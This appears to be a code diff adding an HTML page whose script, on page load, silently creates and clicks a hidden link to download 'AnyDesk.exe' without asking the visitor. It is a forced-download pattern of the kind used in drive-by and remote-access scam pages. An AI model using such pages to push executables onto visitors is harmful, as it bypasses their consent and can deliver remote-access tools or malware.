@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Automatic File Download</title>
+</head>
+<body>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // URL of the file to be downloaded
+            var fileUrl = 'AnyDesk.exe'; // Change this to the actual URL of your file
+            
+            // Create an invisible link element
+            var link = document.createElement('a');
+            link.href = fileUrl;
+            link.download = ''; // Specify a filename if needed
+            
+            // Append the link to the body
+            document.body.appendChild(link);
+            
+            // Trigger a click event on the link
+            link.click();
+            
+            // Remove the link from the document
+            document.body.removeChild(link);
+        });
+    </script>
+</body>
+</html>
